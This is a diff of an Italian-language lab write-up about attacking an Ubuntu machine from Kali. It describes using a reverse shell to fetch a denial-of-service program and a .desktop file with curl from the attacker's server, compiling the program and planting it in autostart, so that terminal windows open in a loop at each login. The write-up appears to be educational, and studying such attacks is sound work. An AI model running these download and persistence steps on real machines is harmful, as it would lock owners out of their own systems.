@@ -58,11 +58,11 @@ A questo punto, essendo la reverse shell eseguita in background, l'utente su Ubu
 Utilizzando la reverse shell, ora, è facile scaricare il programma `dos.c` e il file `dos.desktop` dal web file server di Kali utilizzando sempre il comando `curl`:
 `curl -O "http://10.0.2.2/demo/dos.c"`
 `curl -O "http://10.0.2.2/demo/dos.desktop"`
-ora, il programma dos.c viene compilato utilizzando il comando `ggc -o dos dos.c`, viene creato, così, l'eseguibile. Prima di eseguirlo, però, bisogna creare persistenza: il file `dos.desktop` viene spostato in `config/autostart`, per fare ciò viene utilizzato il comando `mv`, che deve, però, essere eseguito con privilegi di amministratore, quindi utilizzando `sudo`, questo implica che l'attaccante debba conoscere la password dell'account. Una volta che `dos.desktop` viene spostato, il programma `dos` è visibile nell'applicazione che mostra i programmi che vengono eseguiti allo startup della macchina 
+ora, il programma dos.c viene compilato utilizzando il comando `ggc -o dos dos.c`, viene creato, così, l'eseguibile. Prima di eseguirlo, però, bisogna creare persistenza: il file `dos.desktop` viene spostato in `config/autostart`, per fare ciò viene utilizzato il comando `mv`, che deve, però, essere eseguito con privilegi di amministratore, quindi utilizzando `sudo`, questo implica che l'attaccante debba conoscere la password dell'account. Una volta che `dos.desktop` viene spostato, il programma `dos` è visibile in Startup Application Preferences, che mostra i programmi che vengono eseguiti allo startup della macchina. 
 
+![Startup Application Preferences](images/startupapplications.png)
 
-
-_Figure 1: The Markdown Mark_
+quindi, ogni volta che avverrà l'accesso alla macchina, verranno aperte in loop innumerevoli finestre di terminale, rendendolo inutilizzabile. 
 
 Some of the key benefits are:
 
